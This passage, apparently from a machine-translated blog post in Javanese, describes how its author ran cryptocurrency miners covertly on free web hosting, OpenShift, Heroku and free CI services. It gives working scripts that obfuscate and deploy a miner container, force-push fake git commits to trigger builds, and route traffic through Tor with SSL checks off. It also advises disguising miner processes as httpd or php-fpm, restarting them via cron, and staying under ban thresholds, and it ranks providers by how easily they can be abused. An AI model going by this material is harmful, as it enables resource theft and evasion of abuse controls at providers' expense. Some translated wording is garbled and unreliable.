. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Luwih becik mung ngandelake builtin amarga proses tambahan forking ora diidini ing penjara web, nanging mesthi bisa<code>exec</code> sing ngidini kita nggunakake paling akeh utilitas baris perintah. Umume cangkang web ditulis ing basa skrip liyane kaya python utawa php amarga sampeyan ora prelu kuwatir.<p>Ing lingkungan cpanel, luwih becik nggunakake jeneng statis kanggo proses panambang, kaya<code>httpd</code> utawa<code>php-fpm</code> amarga<code>cgi</code> adhedhasar multi proses, mula server mesthi diisi karo akeh proses sing dijenengi kaya iki, sanajan pengamat sing ati-ati kudu ngerti<em> multi-Utas</em> pola panggunaan sing mesthi ora umum (utawa bisa) kanggo basa kayata perl, php, ruby, utawa python!<p>Proses uga duwe wates wektu kanthi gawan, (1 jam, 1 dina, lsp.), Amarga iki mung nggunakake lowongan kerja cron sing miwiti maneh dropper.<p>Iki mbutuhake akeh suntingan manual, cpanel api kanggo ngotomatisasi iki sayangÃ© ora kena pangguna pungkasan, mula hosting web minangka target sing lucu lan mboseni kanggo dropper penambang kita.<h3 id=web_environments><a class=header-anchor href=#web_environments> Lingkungan web</a></h3><p>Ana<em> SaaS</em> panyedhiya sing duwe editor web ditambah karo wadhah, kayata<a href="with a free tier before getting acquired by amazon"> awan9</a> , [codeanywhere], [codenvy]. Nyebarke dropper ing kene gampang (sampeyan duwe lingkungan sing akeh), nanging tetep mlaku dadi beban, amarga ana editor web interaktif mungkasi sesi sawise kaca web ditutup, lan wadhah kasebut banjur turu (kajaba sampeyan mbayar mesthi).<p>Sunting iki mung ateges kita kudu tetep mbukak sesi, sawetara skrip karo [dalang] entuk asil sing dikarepake, nanging yen wis suwe, memori bocor, kaca web SPA kembung mesthi ora apik lan ora siluman, amarga saka backend panyedhiya, sesi dibukak 24/7 mesthi bakal curiga. Pancen, lingkungan web uga target sing angel lan mboseni.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Layanan app gratis</a></h3><p>Iki utamane<a href="when it used to have a free tier"> openhift</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> lan [heroku]. Openshift, dadi kubernetes cukup gampang dipasang, nanging kebak konfigurasi konfigurasi, iki kutipan:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Iki minangka skrip sing digunakake kanggo mbangun kontainer pertambangan sing mbutuhake template yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Nanging kabeh proses kalebu akeh langkah!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>Ing kode semu:<ul><li><p>nggawe proyek<li><p>nggawe aplikasi tanpa gambar<li><p>gawe wadhah tambang<li><p>masang wadhah kanthi config penyebaran (kubernetes abstraksi)<li><p>ngluncurake penyebaran</ul><p>Ing<code>build-build</code> skrip malah digawe a<em> mbangun</em> wadhah sing bakal mine sawetara jam bebarengan. Bangunan lan polong normal duwe sumber kapisah ing openhift dadi kita ngeksploitasi kalorone. Openshift umume dadi pengalaman sing ora apik amarga wis liwat 4 rilis sing beda (bisa uga luwih, aku mandheg nglacak sawise sawetara wektu) lan masing-masing mbutuhake pangowahan konfigurasi, ora ana jalur upgrade lan kabeh wis diulang kanthi cepet, lan umume kanggo nggawe / polong bisa mandheg, lan ora diklumpukake ... biasane mbukak manual maneh saben-saben, bisa uga kubernetes mung buggy :)<p>Konfigurasi Heroku luwih gampang (ora kalebu kubernetes). Kajaba gawe wadhah, sing padha karo openhift, sisane mung rong prentah<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Wadhah kasebut langsung di-push karo docker menyang registri heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> Gesekan karo heroku (undakan gratis sing isih ana nalika nulis) yaiku yen dinos mung bisa mlaku sajrone 22 dina saben wulan, mula dibutuhake manajemen manual saben wulan, maneh uga repot lan mboseni. Dheweke nindakake sawetara gelombang larangan ing wiwitan, lan banjur mateni registrasi liwat TOR, aku yakin manawa aku dadi sebab iki.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Wadhah CI utawa VM</a></h3><p>Iki minangka target sing paling sinergis kanggo dropper kita. Ana akeh<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> perusahaan, akeh sing ngobong dhuwit para investor kanggo nawakake level gratis kanthi pangarep-arep bisa ngoleksi pangsa pasar ing bisnis infrastruktur teknologi.<p>Kabeh layanan kasebut nawakake macem-macem sumber, beda syarat konfigurasi lan mbukak ing macem-macem lingkungan. Aku ora nate mikir babagan otomatis akun registrasi amarga prekara-prekara kasebut pancen ora apik kanggo program, aku nyoba ngindhari kabeh, mula aku mung sabar registrasi manual nalika aku kepengin ngerti apa tanggapan anti spam sing bakal dakkirim (lan bedane karo liyane!). Sampeyan bisa ngramal sawetara babagan manajemen perusahaan babagan cara ngatasi spam:<ul><li><p>Apa nindakake gelombang larangan? Banjur duwe kabijakan sing ora ketat, masalah ditangani kanthi manual lan saben kasus<li><p>Apa dibutuhake verifikasi telpon? Dheweke wis dilecehke biyen<li><p>Apa dheweke nanggapi panggunaan sumber daya sing abot? Dheweke mlaku kanthi anggaran sing sempit<li><p>Apa dheweke ngetrapake watesan akun utawa larangan bayangan? Yen nglarang bayangan, dheweke duwe sysadmin.</ul><p>Ana uga pitakon filosofis: Yen layanan ngidini sampeyan nyalah gunakake sisteme suwene, apa tegese duwe infrastruktur paling dhuwur sing bisa ngatasi beban kasebut, utawa mung ora ngontrol sisteme? Lan sampeyan kudu nimbang keseimbangan antarane aksesibilitas lan keamanan, sistem sing aman bisa nyuda penylametan pangguna.<p>Mangkene tabel sing nuduhake sawetara layanan sing dakpasang menyang:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>konfigurasi<th style=text-align:center>kinerja<th style=text-align:center>ban-palu<tr><td style=text-align:center>Biter<td style=color:red;text-align:center>ala<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>apik<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>apik<tr><td style=text-align:center>Kode Pos<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>ala<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>apik<td style=color:green;text-align:center>apik<tr><td style=text-align:center>Sirkulasi<td style=color:red;text-align:center>ala<td style=color:green;text-align:center>apik<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Semaphore<td style=color:green;text-align:center>apik<td style=color:green;text-align:center>apik<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Docker<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>apik<tr><td style=text-align:center>Dhewe<td style=color:green;text-align:center>apik<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>ala<td style=color:green;text-align:center>apik<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>ala<tr><td style=text-align:center>Pipa Azure<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>ala<tr><td style=text-align:center>Terus-terusan<td style=color:red;text-align:center>ala<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Kanca<td style=color:red;text-align:center>ala<td style=color:red;text-align:center>ala<td style=color:red;text-align:center>ala<tr><td style=text-align:center>Mbengung<td style=color:red;text-align:center>ala<td style=color:green;text-align:center>apik<td style=color:red;text-align:center>ala<tr><td style=text-align:center>Pendhapat<td style=color:red;text-align:center>ala<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>ala<tr><td style=text-align:center>Kodecode<td style=color:red;text-align:center>ala<td style=color:green;text-align:center>apik<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Zeist / vercel<td style=color:red;text-align:center>ala<td style=color:green;text-align:center>apik<td style=color:red;text-align:center>ala</table><p>Ing konteks iki, a<span style=color:green> apik</span> konfigurasi tegese ora mbutuhake wektu akeh kanggo ngatur a<code>ci</code> tugas kanggo proses penambangan (kaya kabeh layanan sing gumantung ing dashboard web, dudu file titik repositori minangka tugas utama),<span style=color:red> ala</span><code>ban-hammer</code> tegese angel ndhaptar layanan kasebut, utawa akun kasebut bakal dilarang kanthi luwih agresif.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Biter</a> kudu nyiyapake proyek, kanggo nyimpulake lingkungan, arsitektur target, proses eksekusi lan liya-liyane, butuh wektu kanggo nyiyapake konstruksi mula entuk rating sing ora apik ing konfigurasi.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Terus-terusan</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Kanca</a> , [Codefresh] uga duwe akeh langkah konfigurasi non deklaratif kanthi manual.<p>Layanan kaya [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Kanca</a> ngetrapake bayang-bayang ing akun, larangan bayang-bayang ala, amarga sampeyan ora bisa ngira manawa ana konfigurasi sing salah utawa ora. Kanthi sawetara layanan, sampeyan bisa ngramal alesan larangan kasebut (bangunan sampeyan mbutuhake wektu akeh banget, utawa sampeyan kakehan nggawe wektu ora suwe), kanggo sawetara liyane kaya [Azure-pipelines] Aku nganggep dheweke ngetrapake sidik jari menyang repositori pangguna amarga larangan dileksanakake sanajan ora ana penyalahgunaan sumber daya, azure lan vercel uga diwatesi<code>DNS</code> akses ing mesin bangunan umum, dadi ana gesekan tambahan sing kudu diatasi karo trowongan ad-hoc.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Mbengung</a> menehi akses menyang prosesor 16+ inti kabeh nanging pungkasane dilarang sawise 2 dibangun<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Kode Pos</a> uga menehi akses menyang host sing kuat lan ora nglarang agresif kaya drone.<p>Layanan favoritku dudu amarga untung nanging gampang lan gampang (uga karo proyek liyane)<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Semaphore</a> lan<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-hub</a> . Travis kaya CI standar lan fleksibel, mung Semaphore<code>DSL</code> kanggo<code>CI</code> sing katon bisa dicedhaki lan uga ora mung kothak centhang spaghettified kaya UI liyane, lan Docker mung kanggo kesederhanaan kanggo map dockerfiles sing bakal dibangun.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Mbangun configs</a></h3><p>Bangunan kasebut dipicu dening proyek cron sing ditawakake layanan web utawa kanthi komitmen kom. Dadi sampeyan kudu nglacak sampah saka token akses utawa tombol ssh kanggo ngatur kabeh komitmen git. Sampeyan uga penting supaya ora nindakake spam, lan nggunakake proxy nalika nyurung repositori sing ngatur git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Nggunakake layanan hosting git, github minangka sing luwih lengkap babagan larangan, nanging mung dieksekusi sawise dilaporake dening admin layanan ci, gitlab nglakokake gelombang larangan, nalika nyoba nganyari uji coba CI (kanthi ora sengaja). Aku durung nate nampa larangan kanggo akun bitbucket. Kanggo (meksa) push git commits, kita duwe daur ulang dawa sing menehi label ing repositori git:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>Sampeyan bisa uga meksa meksa nindakake perkara iki dudu prekara sing disenengi github lan bisa uga nyebabake akun diwenehi tandha. Fungsi tagger sing ditugasake meksa nindakake perkara sing beda-beda, nggunakake situs web (sing bisa gampang digoleki) sing menehi komitmen acak. Aku ora yakin sepira pitulung iki, amarga konten sing ditindakake mesthi curiga kanggo kasusku. Lan aku uga nate nesu ing bokong, amarga komisi sing diwenehake kanthi printah iki bisa uga kalebu tembung sumpah, salah sawijining komitmenku dijupuk dening bot twitter sing nglacak git karo tembung sumpah! Aku nambah dhaptar ireng kanggo tembung ala sawise kedadeyan kasebut.<p>Aku durung ngerti babagan komitmen git obfuscated lan repositori git obfuscated. Siji-sijine conto sing nggunakake repositori sing luwih rumit yaiku karo Bitrise amarga sampeyan ora bisa nyiyapake build yen sistem ora ngerti lingkungan (kaya aplikasi seluler), nanging sanajan ora ana rotasi lan mesthi padha repositori, cukup gampang dideleng.<p>Umume, yen aku kudu ngrancang kurva lonceng sajrone wektu sing optimal kanggo tambang<em> tanpa</em>nglarang akun, ing kabeh layanan sing wis dites, bakal duwe pusat udakara udakara 1 jam, saben dina. Kanggo intine CPU, kajaba kanggo wong sing ora sopan (kaya drone), umume layanan pengin nggunakake akeh sumber daya sing diwenehake amarga dibangun nganggo VM utawa kontainer kanthi sumber daya sing diwatesi ... lan kompilasi biasane dadi tugas saturate cpu, dadi ora ana gandhengane statistik. Secara intuitif, siji bangunan saben dinane bakal ditindakake pangembang rata-rata, mula sampeyan kudu ngarepake panji sing mundhak yen sampeyan kesasar saka tegese, lan meksa nindakake perkara planggaran ora bakal entek.<h2 id=conclusions><a class=header-anchor href=#conclusions> Kesimpulan</a></h2><p>Apa regane? Bagian jaringan mesthi apik, urusan karo registrasi akun jelas bagean paling ala, ora ana sing seneng ngeklik email konfirmasi tanpa wates lan mbaleni prosedur UI sing mbebayani. Nulis piranti lunak otomasi spam uga mboseni (amarga sampeyan biasane nggunakake API bisu), lan asumsi iki (lan kasunyatane iki ora nate serius) Aku malah ora nate nganggep. Apa bathi? Ing pucukÃ© wis tekan kaya<code>300$</code> saben wulan, bisa uga cukup kanggo venezuelan, dudu kanggo aku :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> sysadmin sing grundel</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>sanajan iki bakal ngrusak akeh asumsi privasi, aku yakin umume umume mung ndeleng ing njero masalah sing ana, nanging iki mung dadi masalah nalika runtime adhedhasar kontainer, dene VM minangka kothak ireng.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>penambang sing dibangun ing simpul monero entuk kerja supaya luwih ramah ing latar mburi, nanging distribusi xmrig ora nate fokus ing keramahan latar mburi.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>sawetara kolam nawakake macem-macem kangelan ing port sambungan sing beda, lan cenderung nyelarasake kesulitan kerja karo saham sing ditambang panambang, nanging granit saka proksi isih luwih trep, amarga bakal nyegah kolam<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> ngunci</a> (sanajan kita ora nate ngalih kolam).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>ora seneng nalika config tiba-tiba muncul lan ilang saka sistem file</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Kita ora ngomong babagan<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> protokol stratum</a> amarga kita mung kudu menehi hasil karo apa wae sing dileksanakake ing<em> kalorone</em> kolam lan panambang ... sing biasane minimal, lan bisa uga tanpa ekstensi standar.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>ora bakal kebak bash :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Aku durung nemokake apa sing kedadeyan nalika proses akeh fungsionalitas tambahan nalika runtime, amarga kernel bakal nggoleki alamat ing tata letak memori sing bisa dieksekusi, sing bakal ngakses sistem file lan bisa uga nyebabake kacilakan.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Watesan sewenang-wenang, wektu cpu kurang saka detik, memori kurang saka 128M, koneksi njaba diblokir.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>kanthi sabar, sampeyan uga bisa mbukak conto lengkap babagan lingkungan sing ana ing ruang akun cpanel,<em> tanpa</em> duwe akses menyang SSH cpanel builtin sing cenderung dipateni dening panyedhiya hosting.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openhift wiwit saka undakan gratis 1 taun nganti 3 wulan nganti 1 wulan, wiwit mbutuhake otentikasi telpon, aku bisa njamin manawa dudu aku sing nyalah gunakake layanane.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Wadah undakan gratis Heroku cukup akeh sumber daya, nyedhiyakake 4c / 8t (virtual) cpus, akeh ram lan panyimpenan gedhe (nanging ora terus-terusan lan dibuwang nalika mateni dyno).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Dheweke nambah aturan registrasi sing luwih angel, sawise sawetara larangan, aku bisa uga menehi sumbangan.</table><p><div id=post-tags-list>Tag Pos: <span class=post-tag><a href=https://www.unto.re/tag/crypto> kripto</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> jaring</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> cangkang</a></span></div><div class=page-foot><div class=copyright>21 Agustus 2021</div></div></div><div class=page__footer><footer><div class=page__footer-copyright>Â© untoreh - Didukung dening<a href=https://github.com/tlienart/Franklin.jl> Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/jw/sitemapxml> Peta Situs</a></li> | <li><a href=/jw/tag> Tags</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></footer></div>